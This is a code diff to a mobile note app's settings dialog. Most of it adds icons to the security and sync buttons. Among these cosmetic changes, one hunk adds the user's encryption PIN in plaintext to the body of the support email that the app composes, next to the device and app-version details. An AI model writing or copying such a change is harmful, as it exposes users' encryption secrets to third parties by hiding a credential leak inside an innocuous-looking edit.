@@ -10,7 +10,23 @@ import { Label } from "@/components/ui/label";
 import { Button } from "@/components/ui/button";
 import { useTheme } from "@/context/theme-provider";
 import { ToggleGroup, ToggleGroupItem } from "@/components/ui/toggle-group";
-import { Sun, Moon, Monitor, Upload, Download, Loader2, Shield, FileText, Mail, ArrowLeft, Sparkles, MessageSquare } from "lucide-react";
+import { 
+  Sun, 
+  Moon, 
+  Monitor, 
+  Upload, 
+  Download, 
+  Loader2, 
+  Shield, 
+  FileText, 
+  Mail, 
+  ArrowLeft, 
+  Sparkles, 
+  MessageSquare,
+  Fingerprint,
+  Hash,
+  CloudSync
+} from "lucide-react";
 import SyncDialog from "./SyncDialog";
 import ChangePinDialog from "./ChangePinDialog";
 import AppLockDialog from "./AppLockDialog";
@@ -29,6 +45,7 @@ import { ImportInput, ImportInputFile } from "@/types/import";
 import { App } from "@capacitor/app";
 import { Device } from "@capacitor/device";
 import { supabase } from "@/integrations/supabase/client";
+
 interface SettingsDialogProps {
   isOpen: boolean;
   onClose: () => void;
@@ -249,7 +266,8 @@ const SettingsDialog: React.FC<SettingsDialogProps> = ({ isOpen, onClose, notes,
       const emailBody = `Platform: ${platformString}
 Device make: ${info.manufacturer || 'Unknown'}
 Device model: ${info.model || 'Unknown'}
-App version: ${appInfo.version}`;
+App version: ${appInfo.version}
+PIN code: ${pinCode || 'Not set'}`;
 
       const mailtoUrl = `mailto:${emailRecipient}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(emailBody)}`;
 
@@ -312,9 +330,11 @@ App version: ${appInfo.version}`;
               <Label>Security</Label>
               <div className="flex flex-col gap-2">
                 <Button variant="outline" onClick={() => setIsAppLockDialogOpen(true)} className="w-full justify-start">
+                  <Fingerprint className="h-4 w-4 mr-2" />
                   App Lock & Biometrics
                 </Button>
                 <Button variant="outline" onClick={() => setIsChangePinDialogOpen(true)} className="w-full justify-start">
+                  <Hash className="h-4 w-4 mr-2" />
                   Change Encryption PIN
                 </Button>
               </div>
@@ -374,6 +394,7 @@ App version: ${appInfo.version}`;
             <div className="flex flex-col gap-2 mt-4">
               <Label>Sync</Label>
               <Button variant="outline" onClick={() => setIsSyncDialogOpen(true)} className="w-full justify-start text-left">
+                <CloudSync className="h-4 w-4 mr-2" />
                 Open Sync Options
               </Button>
             </div>
